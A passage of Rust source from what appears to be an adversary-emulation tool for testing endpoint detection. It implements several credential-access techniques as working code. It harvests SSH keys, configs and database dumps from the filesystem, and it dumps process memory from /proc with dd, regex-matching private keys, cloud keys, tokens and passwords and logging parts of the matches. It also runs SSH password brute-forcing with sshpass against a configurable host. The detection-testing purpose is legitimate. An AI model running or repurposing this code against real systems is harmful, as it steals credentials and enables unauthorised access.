                writeln!(log, "### 14. Root SSH Keys (/root/.ssh) - ROOT ONLY").unwrap();
                search_locations.push("/root/.ssh (root SSH keys)".to_string());
                
                let root_ssh = Path::new("/root/.ssh");
                if root_ssh.exists() {
                    writeln!(log, "Searching: {}", root_ssh.display()).unwrap();
                    
                    if let Ok(entries) = fs::read_dir(root_ssh) {
                        for entry in entries.flatten() {
                            let path = entry.path();
                            files_searched += 1;
                            
                            if let Ok(content) = fs::read_to_string(&path) {
                                let (found, count, types) = search_file_for_credentials(&path, &content, &mut log);
                                
                                if found {
                                    credential_files_found += 1;
                                    total_patterns_found += count;
                                    writeln!(log, "[OK] Credential file: {} ({} patterns)", path.display(), count).unwrap();
                                    
                                    findings.push(CredentialFinding {
                                        file_path: path.display().to_string(),
                                        credential_type: types.join(", "),
                                        pattern_matches: count,
                                    });
                                }
                            }
                        }
                    }
                } else {
                    writeln!(log, "/root/.ssh does not exist or is not accessible").unwrap();
                }
                writeln!(log).unwrap();
            }
            
            // NEW v1.5.13: Section 15 - /usr/local/etc local configurations
            writeln!(log, "### 15. Local Configuration Files (/usr/local/etc)").unwrap();
            search_locations.push("/usr/local/etc (local configs)".to_string());
            
            if Path::new("/usr/local/etc").exists() {
                let find_output = Command::new("find")
                    .arg("/usr/local/etc")
                    .arg("-type")
                    .arg("f")
                    .arg("-readable")
                    .arg("2>/dev/null")
                    .output()
                    .await;
                
                if let Ok(output) = find_output {
                    let config_files = String::from_utf8_lossy(&output.stdout);
                    for config_path in config_files.lines().take(30) {
                        if config_path.is_empty() || config_path.len() > 200 {
                            continue;
                        }
                        
                        // Only search files that might contain credentials
                        if config_path.ends_with(".conf") || config_path.ends_with(".config") 
                            || config_path.ends_with(".yml") || config_path.ends_with(".yaml")
                            || config_path.ends_with(".properties") || config_path.ends_with(".json") {
                            
                            files_searched += 1;
                            writeln!(log, "Searching: {config_path}").unwrap();
                            
                            if let Ok(content) = fs::read_to_string(config_path) {
                                let (found, count, types) = search_file_for_credentials(Path::new(config_path), &content, &mut log);
                                
                                if found {
                                    credential_files_found += 1;
                                    total_patterns_found += count;
                                    writeln!(log, "[OK] Credential file: {config_path} ({count} patterns)").unwrap();
                                    
                                    findings.push(CredentialFinding {
                                        file_path: config_path.to_string(),
                                        credential_type: if types.is_empty() { "Local Config Credentials".to_string() } else { types.join(", ") },
                                        pattern_matches: count,
                                    });
                                }
                            }
                        }
                    }
                }
            } else {
                writeln!(log, "/usr/local/etc does not exist or is not accessible").unwrap();
            }
            writeln!(log).unwrap();
            
            // NEW v1.5.13: Section 16 - Database dump files
            writeln!(log, "### 16. Database Dump Files (*.sql, *.dump, *.backup)").unwrap();
            search_locations.push("Database dumps (*.sql, *.dump, *.backup)".to_string());
            
            // Search common locations for database dumps
            let dump_search_dirs = vec!["/tmp", "/var/tmp", "/var/backups", "/home"];
            
            for search_dir in &dump_search_dirs {
                if Path::new(search_dir).exists() {
                    writeln!(log, "Searching {search_dir} for database dumps...").unwrap();
                    
                    for dump_pattern in &["*.sql", "*.dump", "*.backup"] {
                        let find_output = Command::new("find")
                            .arg(search_dir)
                            .arg("-maxdepth")
                            .arg("3")
                            .arg("-name")
                            .arg(dump_pattern)
                            .arg("-type")
                            .arg("f")
                            .arg("-readable")
                            .arg("2>/dev/null")
                            .output()
                            .await;
                        
                        if let Ok(output) = find_output {
                            let dump_files = String::from_utf8_lossy(&output.stdout);
                            for dump_path in dump_files.lines().take(10) {
                                if dump_path.is_empty() {
                                    continue;
                                }
                                
                                files_searched += 1;
                                writeln!(log, "Searching: {dump_path}").unwrap();
                                
                                // Read first 100KB of dump file to check for credentials
                                if let Ok(content) = fs::read_to_string(dump_path) {
                                    let sample = content.chars().take(100000).collect::<String>();
                                    
                                    // Check for CREATE USER, PASSWORD, credentials in dumps
                                    let has_create_user = sample.to_lowercase().contains("create user");
                                    let has_password = sample.to_lowercase().contains("password");
                                    let has_grant = sample.to_lowercase().contains("grant ");
                                    
                                    if has_create_user || has_password || has_grant {
                                        credential_files_found += 1;
                                        let pattern_count = (has_create_user as usize) + (has_password as usize) + (has_grant as usize);
                                        total_patterns_found += pattern_count;
                                        writeln!(log, "[OK] Credential file: {dump_path}").unwrap();
                                        writeln!(log, "  [DATABASE DUMP] CREATE USER: {has_create_user}, PASSWORD: {has_password}, GRANT: {has_grant}").unwrap();
                                        
                                        findings.push(CredentialFinding {
                                            file_path: dump_path.to_string(),
                                            credential_type: "Database Dump Credentials".to_string(),
                                            pattern_matches: pattern_count,
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // Summary
            writeln!(log, "## Summary of Credential Harvesting").unwrap();
            writeln!(log).unwrap();
            writeln!(log, "Search Locations Scanned:").unwrap();
            for location in &search_locations {
                writeln!(log,"  - {location}").unwrap();
            }
            writeln!(log).unwrap();
            writeln!(log, "Statistics:").unwrap();
            writeln!(log,"  - Files searched: {files_searched}").unwrap();
            writeln!(log,"  - Credential files found: {credential_files_found}").unwrap();
            writeln!(log,"  - Total credential patterns discovered: {total_patterns_found}").unwrap();
            writeln!(log).unwrap();
            
            if !findings.is_empty() {
                writeln!(log, "Credential Files Discovered:").unwrap();
                for (idx, finding) in findings.iter().enumerate() {
                    writeln!(log, "  {}. {}", idx + 1, finding.file_path).unwrap();
                    writeln!(log, "     Type: {}", finding.credential_type).unwrap();
                    writeln!(log, "     Patterns: {}", finding.pattern_matches).unwrap();
                }
                writeln!(log).unwrap();
            }
            
            writeln!(log, "=== WARNING ===").unwrap();
            writeln!(log, "This is REAL credential harvesting from the actual filesystem.").unwrap();
            writeln!(log, "Actual credential values are NOT logged (only pattern matches).").unwrap();
            writeln!(log, "Ensure proper cleanup and secure handling of all artefacts.").unwrap();
            writeln!(log, "EDR systems should detect this activity as malicious behaviour.").unwrap();
            
            // Log summary to console
            info!("REAL credential harvesting complete:");
            info!("  - Files searched: {files_searched}");
            info!("  - Credential files found: {credential_files_found}");
            info!("  - Credential patterns discovered: {total_patterns_found}");
            info!("  - Log saved to: {output_file}");
            
            let success_message = format!(
                "REAL credential harvesting complete - Searched {files_searched} files, found {credential_files_found} credential files with {total_patterns_found} total patterns"
            );
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: success_message,
                artifacts: vec![output_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artefact: {artifact}"),
                        Err(e) => warn!("Failed to remove artefact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1003.007 - OS Credential Dumping: Proc Filesystem
// ======================================
pub struct ProcFilesystemCredentialDumping {}

#[async_trait]
impl AttackTechnique for ProcFilesystemCredentialDumping {
    fn info(&self) -> Technique {
        Technique {
            id: "T1003.007".to_string(),
            name: "OS Credential Dumping: Proc Filesystem".to_string(),
            description: "Performs REAL memory analysis by reading /proc/[pid]/mem and /proc/[pid]/maps to extract and parse credential patterns from running processes. Uses dd utility for memory extraction and regex pattern matching for SSH keys, API tokens, passwords, and connection strings.".to_string(),
            category: "credential_access".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "target_processes".to_string(),
                    description: "Comma-separated list of process names to target".to_string(),
                    required: false,
                    default: Some("ssh-agent,sshd,bash,systemd,firefox,chrome,nginx,apache2".to_string()),
                },
                TechniqueParameter {
                    name: "memory_dump_size".to_string(),
                    description: "Size of memory to extract per region (bytes)".to_string(),
                    required: false,
                    default: Some("65536".to_string()),
                },
                TechniqueParameter {
                    name: "max_processes".to_string(),
                    description: "Maximum number of processes to analyse".to_string(),
                    required: false,
                    default: Some("5".to_string()),
                },
                TechniqueParameter {
                    name: "max_regions".to_string(),
                    description: "Maximum number of memory regions to analyse per process".to_string(),
                    required: false,
                    default: Some("10".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save detailed analysis logs".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_proc_dump.log".to_string()),
                },
            ],
            detection: "Monitor dd command usage on /proc/<PID>/mem files, excessive /proc filesystem access, memory mapping enumeration, process memory analysis, and credential pattern extraction attempts".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root or process owner".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let target_processes = config
                .parameters
                .get("target_processes")
                .unwrap_or(&"ssh-agent,sshd,bash,systemd,firefox,chrome,nginx,apache2".to_string())
                .clone();
                
            let memory_dump_size = config
                .parameters
                .get("memory_dump_size")
                .unwrap_or(&"65536".to_string())
                .parse::<usize>()
                .unwrap_or(65536);
                
            let max_processes = config
                .parameters
                .get("max_processes")
                .unwrap_or(&"5".to_string())
                .parse::<usize>()
                .unwrap_or(5);
                
            let max_regions = config
                .parameters
                .get("max_regions")
                .unwrap_or(&"10".to_string())
                .parse::<usize>()
                .unwrap_or(10);
                
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_proc_dump.log".to_string())
                .clone();

            let session_id = Uuid::new_v4().to_string().split('-').next().unwrap_or("signalbench").to_string();
            let dump_dir = format!("/tmp/signalbench_proc_dumps_{session_id}");
            
            if dry_run {
                info!("[DRY RUN] Would perform REAL memory analysis on /proc filesystem");
                info!("[DRY RUN] Target processes: {target_processes}");
                info!("[DRY RUN] Memory dump size per region: {memory_dump_size} bytes");
                info!("[DRY RUN] Maximum memory regions per process: {max_regions}");
                info!("[DRY RUN] Would create dumps in: {dump_dir}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would analyse /proc filesystem for {max_processes} target processes"),
                    artifacts: vec![log_file, dump_dir],
                    cleanup_required: false,
                });
            }

            // Create dump directory
            fs::create_dir_all(&dump_dir)
                .map_err(|e| format!("Failed to create dump directory: {e}"))?;

            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            writeln!(log_file_handle, "# SignalBench /proc Filesystem Credential Dumping - REAL Memory Analysis").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK: T1003.007").unwrap();
            writeln!(log_file_handle, "# Target Processes: {target_processes}").unwrap();
            writeln!(log_file_handle, "# Memory Dump Size per Region: {memory_dump_size} bytes").unwrap();
            writeln!(log_file_handle, "# Maximum Regions per Process: {max_regions}").unwrap();
            writeln!(log_file_handle, "# Session ID: {session_id}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();

            // Compile credential patterns using regex
            let ssh_key_pattern = Regex::new(r"-----BEGIN[A-Z ]+PRIVATE KEY-----").unwrap();
            let api_token_patterns = [
                Regex::new(r"sk_[a-zA-Z0-9]{20,}").unwrap(),
                Regex::new(r"api_[a-zA-Z0-9_]{20,}").unwrap(),
                Regex::new(r"token_[a-zA-Z0-9_]{20,}").unwrap(),
                Regex::new(r"bearer[:\s]+[a-zA-Z0-9\-._~+/]+=*").unwrap(),
                Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),  // AWS access key
            ];
            let password_patterns = [
                Regex::new(r"password\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"pwd\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"passwd\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"auth\s*[:=]\s*[^\s]{3,}").unwrap(),
            ];
            let connection_string_patterns = [
                Regex::new(r"postgresql://[^\s]+").unwrap(),
                Regex::new(r"mysql://[^\s]+").unwrap(),
                Regex::new(r"mongodb://[^\s]+").unwrap(),
                Regex::new(r"redis://[^\s]+").unwrap(),
            ];

            // Enumerate processes from /proc
            writeln!(log_file_handle, "\n## Process Enumeration").unwrap();
            info!("Enumerating processes from /proc filesystem...");
            
            let proc_entries = fs::read_dir("/proc")
                .map_err(|e| format!("Failed to read /proc directory: {e}"))?;
                
            let target_process_list: Vec<&str> = target_processes.split(',').collect();
            let mut found_processes = Vec::new();
            
            for entry in proc_entries {
                if found_processes.len() >= max_processes {
                    break;
                }
                
                if let Ok(entry) = entry {
                    if let Ok(file_name) = entry.file_name().into_string() {
                        if let Ok(pid) = file_name.parse::<u32>() {
                            let comm_path = format!("/proc/{pid}/comm");
                            if let Ok(comm_content) = fs::read_to_string(&comm_path) {
                                let process_name = comm_content.trim();
                                
                                if target_process_list.iter().any(|&target| process_name.contains(target)) {
                                    found_processes.push((pid, process_name.to_string()));
                                    writeln!(log_file_handle, "Found target process: {process_name} (PID: {pid})").unwrap();
                                    info!("Found target process: {process_name} (PID: {pid})");
                                }
                            }
                        }
                    }
                }
            }

            writeln!(log_file_handle, "Total target processes found: {}", found_processes.len()).unwrap();
            info!("Total target processes found: {}", found_processes.len());

            // If no target processes found, use current process
            if found_processes.is_empty() {
                let current_pid = std::process::id();
                found_processes.push((current_pid, "signalbench".to_string()));
                writeln!(log_file_handle, "No target processes found, using current process: signalbench (PID: {current_pid})").unwrap();
                info!("No target processes found, using current process (PID: {current_pid})");
            }

            #[derive(Debug)]
            struct CredentialMatch {
                pattern_type: String,
                content: String,
                location: String,
            }
            
            let mut total_credentials_found = 0;
            let mut total_regions_analysed = 0;
            let mut all_matches: Vec<CredentialMatch> = Vec::new();

            // Analyse each process
            for (pid, process_name) in &found_processes {
                writeln!(log_file_handle, "\n## Analysing Process: {process_name} (PID: {pid})").unwrap();
                info!("Analysing process: {process_name} (PID: {pid})");
                
                // Read memory maps
                let maps_path = format!("/proc/{pid}/maps");
                let maps_result = fs::read_to_string(&maps_path);
                
                match maps_result {
                    Ok(maps_content) => {
                        writeln!(log_file_handle, "Successfully read memory maps for PID {pid}").unwrap();
                        
                        // Parse readable memory regions
                        let readable_regions: Vec<_> = maps_content
                            .lines()
                            .filter(|line| line.contains(" r"))
                            .take(max_regions)
                            .collect();
                            
                        writeln!(log_file_handle, "Found {} readable memory regions (analysing up to {})", readable_regions.len(), max_regions).unwrap();
                        info!("Found {} readable memory regions for PID {}", readable_regions.len(), pid);
                        
                        for (index, region) in readable_regions.iter().enumerate() {
                            writeln!(log_file_handle, "\n### Memory Region {}: {}", index + 1, region).unwrap();
                            total_regions_analysed += 1;
                            
                            // Extract memory address range
                            if let Some(addr_range) = region.split_whitespace().next() {
                                if let Some((start_str, end_str)) = addr_range.split_once('-') {
                                    if let (Ok(start_offset), Ok(end_offset)) = (
                                        u64::from_str_radix(start_str, 16),
                                        u64::from_str_radix(end_str, 16)
                                    ) {
                                        let region_size = (end_offset - start_offset).min(memory_dump_size as u64);
                                        let mem_dump_file = format!("{dump_dir}/proc_{pid}_region_{index}.dump");
                                        
                                        writeln!(log_file_handle, "Address range: 0x{start_offset:x} - 0x{end_offset:x} (size: {region_size} bytes)").unwrap();
                                        writeln!(log_file_handle, "Attempting dd memory extraction...").unwrap();
                                        
                                        // Use dd to extract memory region
                                        let dd_command = Command::new("dd")
                                            .arg(format!("if=/proc/{pid}/mem"))
                                            .arg(format!("of={mem_dump_file}"))
                                            .arg("bs=1")
                                            .arg(format!("count={region_size}"))
                                            .arg(format!("skip={start_offset}"))
                                            .arg("conv=noerror,sync")
                                            .stderr(std::process::Stdio::null())
                                            .output()
                                            .await;
                                            
                                        match dd_command {
                                            Ok(output) => {
                                                if output.status.success() && Path::new(&mem_dump_file).exists() {
                                                    if let Ok(dump_content) = fs::read(&mem_dump_file) {
                                                        let content_str = String::from_utf8_lossy(&dump_content);
                                                        let dump_size = dump_content.len();
                                                        
                                                        writeln!(log_file_handle,"Memory extracted: {dump_size} bytes").unwrap();
                                                        
                                                        // Search for SSH private keys
                                                        if let Some(ssh_match) = ssh_key_pattern.find(&content_str) {
                                                            total_credentials_found += 1;
                                                            let matched_text = ssh_match.as_str();
                                                            writeln!(log_file_handle,"[OK] SSH PRIVATE KEY FOUND: {matched_text}").unwrap();
                                                            all_matches.push(CredentialMatch {
                                                                pattern_type: "SSH Private Key".to_string(),
                                                                content: matched_text.to_string(),
                                                                location: format!("PID {} region {}", pid, index + 1),
                                                            });
                                                        }
                                                        
                                                        // Search for API tokens
                                                        for (i, pattern) in api_token_patterns.iter().enumerate() {
                                                            for api_match in pattern.find_iter(&content_str) {
                                                                total_credentials_found += 1;
                                                                let matched_text = api_match.as_str();
                                                                let token_type = match i {
                                                                    0 => "Stripe-like API Key",
                                                                    1 => "Generic API Token",
                                                                    2 => "Token",
                                                                    3 => "Bearer Token",
                                                                    4 => "AWS Access Key",
                                                                    _ => "API Token",
                                                                };
                                                                writeln!(log_file_handle,"[OK] {token_type} FOUND: {matched_text}").unwrap();
                                                                all_matches.push(CredentialMatch {
                                                                    pattern_type: token_type.to_string(),
                                                                    content: matched_text.to_string(),
                                                                    location: format!("PID {} region {}", pid, index + 1),
                                                                });
                                                            }
                                                        }
                                                        
                                                        // Search for passwords
                                                        for password_match in password_patterns.iter().flat_map(|p| p.find_iter(&content_str)) {
                                                            total_credentials_found += 1;
                                                            let matched_text = password_match.as_str();
                                                            writeln!(log_file_handle,"[OK] PASSWORD PATTERN FOUND: {matched_text}").unwrap();
                                                            all_matches.push(CredentialMatch {
                                                                pattern_type: "Password String".to_string(),
                                                                content: matched_text.to_string(),
                                                                location: format!("PID {} region {}", pid, index + 1),
                                                            });
                                                        }
                                                        
                                                        // Search for connection strings
                                                        for conn_match in connection_string_patterns.iter().flat_map(|p| p.find_iter(&content_str)) {
                                                            total_credentials_found += 1;
                                                            let matched_text = conn_match.as_str();
                                                            writeln!(log_file_handle,"[OK] CONNECTION STRING FOUND: {matched_text}").unwrap();
                                                            all_matches.push(CredentialMatch {
                                                                pattern_type: "Database Connection String".to_string(),
                                                                content: matched_text.to_string(),
                                                                location: format!("PID {} region {}", pid, index + 1),
                                                            });
                                                        }
                                                        
                                                        if total_credentials_found == 0 {
                                                            writeln!(log_file_handle, "No credential patterns found in this region").unwrap();
                                                        }
                                                    } else {
                                                        writeln!(log_file_handle, "Failed to read memory dump file").unwrap();
                                                    }
                                                } else {
                                                    writeln!(log_file_handle, "dd command failed or produced no output (likely permission denied)").unwrap();
                                                }
                                            },
                                            Err(e) => {
                                                writeln!(log_file_handle, "Failed to execute dd command: {e}").unwrap();
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    },
                    Err(e) => {
                        writeln!(log_file_handle, "Failed to read memory maps for PID {pid}: {e}").unwrap();
                        warn!("Failed to read memory maps for PID {pid}: {e}");
                    }
                }
                
                // Small delay between processes
                sleep(Duration::from_millis(200)).await;
            }

            // Generate summary
            writeln!(log_file_handle, "\n## Analysis Summary").unwrap();
            writeln!(log_file_handle, "===================================").unwrap();
            writeln!(log_file_handle, "Processes scanned: {}", found_processes.len()).unwrap();
            writeln!(log_file_handle,"Memory regions analysed: {total_regions_analysed}").unwrap();
            writeln!(log_file_handle,"Credential patterns found: {total_credentials_found}").unwrap();
            writeln!(log_file_handle, "Memory dumps stored in: {dump_dir}").unwrap();
            
            if !all_matches.is_empty() {
                writeln!(log_file_handle, "\n## Credential Findings by Type").unwrap();
                
                // Group by type
                use std::collections::HashMap;
                let mut by_type: HashMap<String, Vec<&CredentialMatch>> = HashMap::new();
                for m in &all_matches {
                    by_type.entry(m.pattern_type.clone()).or_default().push(m);
                }
                
                for (cred_type, matches) in by_type {
                    writeln!(log_file_handle, "\n### {}: {} found", cred_type, matches.len()).unwrap();
                    for (i, m) in matches.iter().enumerate() {
                        writeln!(log_file_handle, "  {}. {} ({})", i + 1, m.content.chars().take(80).collect::<String>(), m.location).unwrap();
                    }
                }
            }
            
            writeln!(log_file_handle, "\n## WARNING").unwrap();
            writeln!(log_file_handle, "This is REAL memory analysis that may have extracted sensitive data.").unwrap();
            writeln!(log_file_handle, "Ensure proper cleanup and secure handling of all artifacts.").unwrap();

            info!("REAL memory analysis complete:");
            info!("  - Processes scanned: {}", found_processes.len());
            info!("  - Memory regions analysed: {total_regions_analysed}");
            info!("  - Credential patterns found: {total_credentials_found} (by type)");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "REAL memory analysis complete: {} processes scanned, {} memory regions analysed, {} credential patterns found",
                    found_processes.len(), total_regions_analysed, total_credentials_found
                ),
                artifacts: vec![log_file, dump_dir],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if artifact.contains("signalbench_proc_dumps_") {
                        // Remove dump directory and all contents
                        if let Err(e) = fs::remove_dir_all(artifact) {
                            warn!("Failed to remove dump directory {artifact}: {e}");
                        } else {
                            info!("Removed dump directory: {artifact}");
                        }
                    } else {
                        // Remove single file
                        if let Err(e) = fs::remove_file(artifact) {
                            warn!("Failed to remove artifact {artifact}: {e}");
                        } else {
                            info!("Removed artifact: {artifact}");
                        }
                    }
                }
            }
            Ok(())
        })
    }
}

pub struct SSHBruteForce {}

#[async_trait]
impl AttackTechnique for SSHBruteForce {
    fn info(&self) -> Technique {
        Technique {
            id: "T1110.002".to_string(),
            name: "SSH Brute Force".to_string(),
            description: "Performs REAL SSH brute force authentication attempts against localhost:22. When running as root, creates a temporary test user and attempts authentication with 5-10 different incorrect passwords, generating REAL failed authentication entries in /var/log/auth.log. Measures response timing for each attempt to simulate timing attacks. Requires SSH service running on localhost and root privileges for full functionality.".to_string(),
            category: "credential_access".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "target_host".to_string(),
                    description: "Target SSH host (default: localhost)".to_string(),
                    required: false,
                    default: Some("localhost".to_string()),
                },
                TechniqueParameter {
                    name: "target_port".to_string(),
                    description: "Target SSH port (default: 22)".to_string(),
                    required: false,
                    default: Some("22".to_string()),
                },
                TechniqueParameter {
                    name: "attempt_count".to_string(),
                    description: "Number of brute force attempts (5-10)".to_string(),
                    required: false,
                    default: Some("8".to_string()),
                },
            ],
            detection: "Monitor for multiple failed SSH authentication attempts from single sources, unusual patterns of authentication failures in /var/log/auth.log, repeated connection attempts to SSH service (port 22), and brute force attack patterns indicating credential guessing behaviour. EDR systems should detect rapid sequential authentication failures and timing attack patterns.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root (for full test user creation) or user (for existing user testing)".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let session_id = Uuid::new_v4().to_string();
            let log_file = format!("/tmp/signalbench_brute_force_{session_id}.log");
            let artifact_file = format!("/tmp/signalbench_brute_force_{session_id}_artifacts.json");
            
            let target_host = config
                .parameters
                .get("target_host")
                .unwrap_or(&"localhost".to_string())
                .clone();
                
            let target_port = config
                .parameters
                .get("target_port")
                .unwrap_or(&"22".to_string())
                .clone();
                
            let attempt_count = config
                .parameters
                .get("attempt_count")
                .unwrap_or(&"8".to_string())
                .parse::<usize>()
                .unwrap_or(8)
                .clamp(5, 10);
            
            // Check if running as root
            let is_root = unsafe { libc::geteuid() } == 0;
            
            if dry_run {
                if is_root {
                    info!("[DRY RUN] Would create temporary test user 'signalbench_brute_test'");
                    info!("[DRY RUN] Would perform {attempt_count} REAL SSH brute force attempts against {target_host}:{target_port}");
                    info!("[DRY RUN] Would generate REAL failed authentication entries in /var/log/auth.log");
                } else {
                    info!("[DRY RUN] Would perform {attempt_count} SSH brute force attempts (not root - cannot create test user)");
                }
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would perform REAL SSH brute force with {attempt_count} attempts"),
                    artifacts: vec![log_file, artifact_file],
                    cleanup_required: false,
                });
            }

            // Create log file
            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
            
            writeln!(log, "=== SignalBench SSH Brute Force ===").unwrap();
            writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log, "Session ID: {session_id}").unwrap();
            writeln!(log, "Target: {target_host}:{target_port}").unwrap();
            writeln!(log, "Attempt Count: {attempt_count}").unwrap();
            writeln!(log, "Running as root: {is_root}").unwrap();
            writeln!(log).unwrap();
            
            let artifacts = vec![log_file.clone(), artifact_file.clone()];
            let mut user_created = false;
            let test_username: String;
            
            // Create temporary test user if root
            if is_root {
                test_username = "signalbench_brute_test".to_string();
                let test_password = "SignalBench_TestPass_2024!";
                
                info!("Running as root - creating temporary test user: {test_username}");
                writeln!(log, "## Creating Temporary Test User").unwrap();
                writeln!(log, "Username: {test_username}").unwrap();
                writeln!(log).unwrap();
                
                // Check if user already exists
                let existing_user_check = Command::new("id")
                    .arg(&test_username)
                    .output()
                    .await;
                
                if existing_user_check.is_ok() && existing_user_check.unwrap().status.success() {
                    warn!("User {test_username} already exists - removing first");
                    writeln!(log, "Warning: User already exists - removing first").unwrap();
                    let _ = Command::new("userdel")
                        .args(["-r", &test_username])
                        .output()
                        .await;
                }
                
                // Create user with useradd
                let useradd_output = Command::new("useradd")
                    .args([
                        "-m",
                        "-s", "/bin/bash",
                        &test_username
                    ])
                    .output()
                    .await
                    .map_err(|e| format!("Failed to execute useradd: {e}"))?;
                
                if !useradd_output.status.success() {
                    let stderr = String::from_utf8_lossy(&useradd_output.stderr);
                    writeln!(log, "useradd failed: {stderr}").unwrap();
                    return Err(format!("Failed to create test user: {stderr}"));
                }
                
                writeln!(log, "User created successfully with useradd").unwrap();
                user_created = true;
                
                // Set password with chpasswd
                let chpasswd_output = Command::new("chpasswd")
                    .stdin(std::process::Stdio::piped())
                    .spawn();
                
                if let Ok(mut child) = chpasswd_output {
                    if let Some(mut stdin) = child.stdin.take() {
                        let _ = stdin.write_all(format!("{test_username}:{test_password}\n").as_bytes()).await;
                    }
                    let _ = child.wait().await;
                    writeln!(log, "Password set successfully with chpasswd").unwrap();
                } else {
                    warn!("Failed to set password with chpasswd");
                    writeln!(log, "Warning: Failed to set password with chpasswd").unwrap();
                }
                
                // Verify user creation
                let verify_output = Command::new("grep")
                    .args([&test_username, "/etc/passwd"])
                    .output()
                    .await;
                
                if let Ok(output) = verify_output {
                    if output.status.success() {
                        let passwd_entry = String::from_utf8_lossy(&output.stdout);
                        writeln!(log, "User verified in /etc/passwd: {}", passwd_entry.trim()).unwrap();
                        info!("Test user created and verified: {test_username}");
                    }
                }
            } else {
                warn!("Not running as root - cannot create test user, will use existing system user");
                writeln!(log, "## Root Privileges Not Available").unwrap();
                writeln!(log, "Cannot create temporary test user - will attempt brute force against existing users").unwrap();
                writeln!(log).unwrap();
                
                // Try to find a suitable existing user
                test_username = "root".to_string();
            }
            
            // Common password patterns for brute force
            let password_attempts = [
                "password",
                "Password123",
                "admin",
                "root123",
                "123456",
                "password123",
                "letmein",
                "welcome",
                "admin123",
                "qwerty123",
            ];
            
            // Perform REAL SSH brute force attempts
            writeln!(log, "## Performing REAL SSH Brute Force Attempts").unwrap();
            writeln!(log, "Target User: {test_username}").unwrap();
            writeln!(log, "Target Host: {target_host}:{target_port}").unwrap();
            writeln!(log).unwrap();
            
            info!("Starting REAL SSH brute force attempts against {target_host}:{target_port}");
            
            let mut successful_attempts = 0;
            let mut failed_attempts = 0;
            let mut timing_data = Vec::new();
            
            for (idx, password) in password_attempts.iter().take(attempt_count).enumerate() {
                let attempt_num = idx + 1;
                let start_time = std::time::Instant::now();
                
                info!("Attempt {attempt_num}/{attempt_count}: Testing password pattern: {password}");
                writeln!(log, "Attempt {attempt_num}/{attempt_count}: Testing password: '{password}'").unwrap();
                
                // Use sshpass to attempt SSH authentication
                // This will generate REAL failed authentication entries in auth.log
                let ssh_attempt = Command::new("sshpass")
                    .args([
                        "-p", password,
                        "ssh",
                        "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null",
                        "-o", "ConnectTimeout=5",
                        "-o", "NumberOfPasswordPrompts=1",
                        "-p", &target_port,
                        &format!("{test_username}@{target_host}"),
                        "echo", "test"
                    ])
                    .output()
                    .await;
                
                let elapsed = start_time.elapsed();
                let elapsed_ms = elapsed.as_millis();
                
                match ssh_attempt {
                    Ok(output) => {
                        let success = output.status.success();
                        timing_data.push((attempt_num, password.to_string(), elapsed_ms, success));
                        
                        if success {
                            successful_attempts += 1;
                            writeln!(log, "  Result: SUCCESS (unexpected!)").unwrap();
                            writeln!(log, "  Response time: {elapsed_ms}ms").unwrap();
                            warn!("SSH authentication succeeded (unexpected): {password}");
                        } else {
                            failed_attempts += 1;
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            writeln!(log, "  Result: FAILED").unwrap();
                            writeln!(log, "  Response time: {elapsed_ms}ms").unwrap();
                            writeln!(log, "  Error: {}", stderr.lines().next().unwrap_or("Unknown error")).unwrap();
                        }
                    }
                    Err(e) => {
                        // sshpass not available - fallback to direct SSH
                        warn!("sshpass not available, using direct SSH: {e}");
                        writeln!(log, "  sshpass not available - using direct SSH").unwrap();
                        
                        let fallback_attempt = Command::new("ssh")
                            .args([
                                "-o", "StrictHostKeyChecking=no",
                                "-o", "UserKnownHostsFile=/dev/null",
                                "-o", "ConnectTimeout=5",
                                "-o", "PasswordAuthentication=no",
                                "-p", &target_port,
                                &format!("{test_username}@{target_host}"),
                                "echo", "test"
                            ])
                            .output()
                            .await;
                        
                        if let Ok(_output) = fallback_attempt {
                            failed_attempts += 1;
                            timing_data.push((attempt_num, password.to_string(), elapsed_ms, false));
